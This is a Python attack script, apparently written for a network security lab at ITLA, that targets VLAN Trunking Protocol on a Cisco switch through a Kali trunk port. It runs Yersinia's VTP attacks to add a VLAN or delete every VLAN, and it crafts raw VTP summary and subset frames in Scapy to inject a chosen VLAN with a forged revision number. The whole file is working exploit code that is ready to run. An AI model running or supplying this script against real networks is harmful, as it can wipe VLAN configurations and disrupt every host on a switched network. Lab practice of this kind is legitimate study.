#!/usr/bin/env python3
# VTP ATTACK CON YERSINIA | Matricula: 2023-0316 | ITLA
# Topologia: Kali eth0 <-> SW-CORE Gig0/1 (trunk)
#
# Instalar yersinia si falta:
#   sudo apt install yersinia
#
# Uso:
#   sudo python3 vtp_attack_yersinia.py -a agregar --vlan-id 100 --vlan-nombre HACK
#   sudo python3 vtp_attack_yersinia.py -a borrar
#   sudo python3 vtp_attack_yersinia.py -a interactivo

import subprocess, argparse, sys, os, time, tempfile

INTERFAZ = "eth0"
DURACION  = 5

def banner():
    print("""
+--------------------------------------------------+
|  VTP ATTACK (YERSINIA) | Matricula: 2023-0316   |
|  ITLA - Laboratorio de Seguridad en Redes        |
|  Kali eth0 -> SW-CORE Gig0/1 (trunk)            |
+--------------------------------------------------+
""")

def verificar_yersinia():
    r = subprocess.run(["which", "yersinia"], capture_output=True, text=True)
    if r.returncode != 0:
        print("[!] Yersinia no encontrado.")
        print("    sudo apt install yersinia")
        sys.exit(1)
    print("[+] Yersinia encontrado:", r.stdout.strip())

def verificar_interfaz(iface):
    r = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
    if r.returncode != 0:
        print(f"[!] Interfaz {iface} no encontrada.")
        sys.exit(1)
    if "UP" not in r.stdout:
        print(f"[*] Activando {iface}...")
        subprocess.run(["ip", "link", "set", iface, "up"])
        time.sleep(1)
    print(f"[+] Interfaz {iface} activa")

def crear_vlan_con_scapy(iface, vlan_id, vlan_nombre, dominio):
    """
    Yersinia no permite elegir VLAN ID especifico por CLI.
    Para inyectar una VLAN especifica usamos Scapy directamente.
    """
    print(f"\n[INFO] Inyectando VLAN {vlan_id}:{vlan_nombre} con Scapy")
    from scapy.all import Ether, Raw, sendp
    import struct

    MAC_VTP = "01:00:0c:cc:cc:cc"
    snap    = b"\xaa\xaa\x03\x00\x00\x0c\x20\x03"
    rev     = 127

    # VTP Summary
    dom = dominio.encode().ljust(32, b"\x00")[:32]
    summary = (b"\x01\x01\x01" + bytes([len(dominio)]) + dom +
               struct.pack(">I", rev) + b"\x14\x17\x03\x10" + b"\x00" * 28)

    # VTP Subset con la VLAN elegida
    n   = vlan_nombre.encode()
    p   = (4 - len(n) % 4) % 4
    vlan_data = (bytes([12 + len(n) + p]) + b"\x00\x01" +
                 bytes([len(n)]) + struct.pack(">H", vlan_id) +
                 b"\x05\xdc" + struct.pack(">I", vlan_id) +
                 n + b"\x00" * p)
    subset = b"\x01\x02\x01" + bytes([len(dominio)]) + dom + struct.pack(">I", rev) + vlan_data

    sendp(Ether(dst=MAC_VTP)/Raw(load=snap+summary), iface=iface, verbose=False)
    print("[+] Summary enviado")
    time.sleep(0.5)
    sendp(Ether(dst=MAC_VTP)/Raw(load=snap+subset),  iface=iface, verbose=False)
    print(f"[+] Subset enviado -> VLAN {vlan_id} ({vlan_nombre}) inyectada")
    print("    Verificar: show vlan brief | show vtp status")

def lanzar_yersinia(iface, ataque_num, desc, duracion):
    """
    Usa timeout del sistema para correr Yersinia N segundos
    y matarlo limpiamente. Evita que se quede colgado.
    attack 1 = Adding a VLAN (VLAN generica)
    attack 2 = Deleting all VLANs
    """
    print(f"\n[ATAQUE] {desc} en {iface} ({duracion}s)")
    cmd = ["timeout", str(duracion),
           "yersinia", "vtp",
           "-attack", str(ataque_num),
           "-interface", iface]
    print(f"[*] Ejecutando: {chr(32).join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True)
    # 124 = timeout mato el proceso (normal)
    if r.returncode in [0, 124]:
        print("[+] Ataque enviado correctamente")
    else:
        print(f"[!] Codigo de retorno: {r.returncode}")
    if r.stdout: print(r.stdout)
    if r.stderr: print(r.stderr)
    print("    Verificar: show vlan brief | show vtp status")

def ataque_interactivo(iface):
    print(f"\n[INTERACTIVO] Abriendo Yersinia en {iface}")
    print("  g = protocolo | x = ataques | q = salir\n")
    subprocess.run(["yersinia", "-I", "-interface", iface])

def main():
    global DURACION
    banner()
    p = argparse.ArgumentParser(description="VTP Yersinia | 2023-0316 | ITLA")
    p.add_argument("-i", "--interfaz",    default=INTERFAZ,
                   help="Interfaz de red (default: eth0)")
    p.add_argument("-a", "--accion",
                   choices=["agregar", "borrar", "interactivo"],
                   required=True)
    p.add_argument("-t", "--tiempo",      type=int, default=DURACION,
                   help=f"Segundos del ataque Yersinia (default: {DURACION})")
    p.add_argument("--vlan-id",           type=int, default=None,
                   help="ID de la VLAN a crear (ej: 100)")
    p.add_argument("--vlan-nombre",       default=None,
                   help="Nombre de la VLAN a crear (ej: VLAN-HACK)")
    p.add_argument("-d", "--dominio",     default="LAB-2023-0316",
                   help="Dominio VTP (default: LAB-2023-0316)")
    a = p.parse_args()

    DURACION = a.tiempo

    print(f"Interfaz : {a.interfaz}")
    print(f"Accion   : {a.accion}")
    print(f"Duracion : {DURACION}s")
    if a.vlan_id:
        print(f"VLAN ID  : {a.vlan_id}")
        print(f"VLAN Nom : {a.vlan_nombre or "VLAN-" + str(a.vlan_id)}")
    print()

    verificar_yersinia()
    verificar_interfaz(a.interfaz)

    if a.accion == "agregar":
        if a.vlan_id:
            # VLAN especifica con Scapy
            nombre = a.vlan_nombre or f"VLAN-{a.vlan_id}"
            crear_vlan_con_scapy(a.interfaz, a.vlan_id, nombre, a.dominio)
        else:
            # VLAN generica con Yersinia
            lanzar_yersinia(a.interfaz, 1, "Agregando VLAN via VTP", DURACION)

    elif a.accion == "borrar":
        lanzar_yersinia(a.interfaz, 2, "Borrando todas las VLANs via VTP", DURACION)

    elif a.accion == "interactivo":
        ataque_interactivo(a.interfaz)

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[!] Ejecutar con sudo")
    main()
